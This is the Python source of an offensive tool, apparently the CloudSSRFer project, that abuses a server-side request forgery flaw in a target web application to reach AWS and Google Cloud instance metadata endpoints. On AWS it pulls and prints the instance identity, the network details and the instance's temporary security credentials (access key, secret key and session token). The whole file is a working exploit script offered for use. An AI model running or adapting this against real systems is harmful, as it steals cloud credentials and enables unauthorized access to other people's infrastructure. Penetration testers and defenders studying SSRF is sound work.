#  __     __     ______     ______   __     ______     __   __    
# /\ \  _ \ \   /\  __ \   /\__  _\ /\ \   /\  __ \   /\ "-.\ \   
# \ \ \/ ".\ \  \ \  __ \  \/_/\ \/ \ \ \  \ \ \/\ \  \ \ \-.  \  
#  \ \__/".~\_\  \ \_\ \_\    \ \_\  \ \_\  \ \_____\  \ \_\\"\_\ 
#   \/_/   \/_/   \/_/\/_/     \/_/   \/_/   \/_____/   \/_/ \/_/ 

import requests
import sys
from urllib.parse import urlparse, urlsplit

cloud_config = None

def requester(endpoint_url, is_json=False):
    response = requests.get(endpoint_url)
    if response.status_code == 200:
        if is_json:
            return response.json()
        return response.text
    else:
        raise Exception("Failed to fetch url: {}".format(response.status_code))

def fprint(msg, prefix_count=4, prefix=" "):
    print(prefix * prefix_count, msg)

def get_cloud_config():
    clouds = [
        {'type': 1, 'provider': 'Amazon AWS', 'verify_url': 'http://169.254.169.254/latest/meta-data/ami-id'},
        {'type': 2, 'provider': 'Google Cloud', 'verify_url': 'http://metadata.google.internal/computeMetadata'}
    ]
    
    for cloud in clouds:
        check_cloud_response = requests.get(target_base_url + cloud['verify_url'])
        if check_cloud_response.status_code == 200:
            return cloud
    
    return None

def get_aws_info():
    base_url = f'{target_base_url}http://169.254.169.254/latest'

    instance_identity = requester(f'{base_url}/dynamic/instance-identity/document', True)
    print("[+] Instance Info", end="\n\n")
    for key,value in instance_identity.items():
        if key in ["accountId", "instanceId", "instanceType", "region", "architecture", "privateIp"]:
            print(f"    {key}: {value}")

    print("\n[+] Instance Access Token", end="\n\n")
    ec2_credentials = requester(f'{base_url}/meta-data/identity-credentials/ec2/security-credentials/ec2-instance', True)
    for key,value in ec2_credentials.items():
        if key in ["AccessKeyId", "SecretAccessKey", "Token", "Expiration"]:
            print(f"    {key}: {value}")

    print("\n[+] Network Info", end="\n\n")
    for mac in requester(f'{base_url}/meta-data/network/interfaces/macs/').split():
        mac = mac[:-1]
        fprint(f"Interface {mac}\n", 2)
        fprint(f"Security Groups: {requester(f'{base_url}/meta-data/network/interfaces/macs/{mac}/security-groups')}")
        fprint(f"Public Hostname: {requester(f'{base_url}/meta-data/network/interfaces/macs/{mac}/public-hostname')}")
        fprint(f"Public IPv4: {requester(f'{base_url}/meta-data/network/interfaces/macs/{mac}/public-ipv4s/')}")
        fprint(f"Local Network IPv4: {requester(f'{base_url}/meta-data/network/interfaces/macs/{mac}/local-ipv4s')}")
        fprint(f"Local Network Subnet: {requester(f'{base_url}/meta-data/network/interfaces/macs/{mac}/subnet-ipv4-cidr-block')}")
        fprint(f"Local Hostname: {requester(f'{base_url}/meta-data/network/interfaces/macs/{mac}/local-hostname')}")

def get_google_cloud_info():
    # All of Google /computeMetadata/v1 needs an 'atm' header, so we cannot exploit it through SSRF.
    # I think that /computeMetadata/v1beta1, which some writeups mention, has been removed by Google.
    # If you find the right way, you can help us improve this tool.
    # Ref: https://cloud.google.com/appengine/docs/legacy/standard/java/accessing-instance-metadata
    print('[-] Currently, based on the latest Google updates, there is nothing special that we can extract from Google metadata endpoints.')

if __name__ == '__main__':

    print("\n\n  __     __     ______     ______   __     ______     __   __    ")
    print(" /\\ \\  _ \\ \\   /\\  __ \\   /\\__  _\\ /\\ \\   /\\  __ \\   /\\ \"-.\\ \\   ")
    print(" \\ \\ \\/ \".\\ \\  \\ \\  __ \\  \\/_/\\ \\/ \\ \\ \\  \\ \\ \\/\\ \\  \\ \\ \\-.  \\  ")
    print("  \\ \\__/\".~\\_\\  \\ \\_\\ \\_\\    \\ \\_\\  \\ \\_\\  \\ \\_____\\  \\ \\_\\\"\\_ \\ ")
    print("   \\/_/   \\/_/   \\/_/\\/_/     \\/_/   \\/_/   \\/_____/   \\/_/ \\/_/ ")
    print("          https://github.com/TheWation/CloudSSRFer", end="\n\n")

    try:
        target_base_url = sys.argv[1]
    except:
        target_base_url = input('Enter your SSRF base url: ')
    
    parsed_url = urlparse(target_base_url)
    if not(parsed_url.scheme and parsed_url.netloc):
        print("[-] Enter valid target base url.")
        exit()
    
    cloud_config = get_cloud_config()
    if cloud_config == None:
        print('[-] Cloud detection failed.')
        exit()
    
    print("\n[+] Cloud Information", end="\n\n")
    fprint(f"Provider {cloud_config['provider']}\n")

    if cloud_config['type'] == 1:
        get_aws_info()
    elif cloud_config['type'] == 2:
        get_google_cloud_info()